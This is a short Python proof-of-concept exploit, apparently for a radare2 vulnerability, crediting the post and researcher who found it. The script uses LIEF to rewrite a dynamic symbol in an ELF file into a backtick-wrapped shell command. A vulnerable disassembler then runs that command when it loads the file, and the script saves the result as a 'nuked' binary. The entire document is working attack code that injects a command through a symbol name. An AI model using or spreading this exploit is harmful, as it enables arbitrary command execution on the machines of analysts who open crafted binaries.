
"""
Read details: https://bananamafia.dev/post/r2-pwndebian/

Vulnerability found by @CaptnBanana

"""


import sys
import lief
import os

def changeSymbolName(binary,exSymbol,symbol):
	symbol = "`!%s`"%(symbol)
	exSymbol.name = symbol

if __name__ == "__main__":
	binary = lief.parse(sys.argv[1])
	oldSymbol = sys.argv[2]
	command = sys.argv[3]
	changeSymbolName(binary,binary.get_dynamic_symbol(oldSymbol),command)
	binary.write("nuked_%s"%(binary.name))

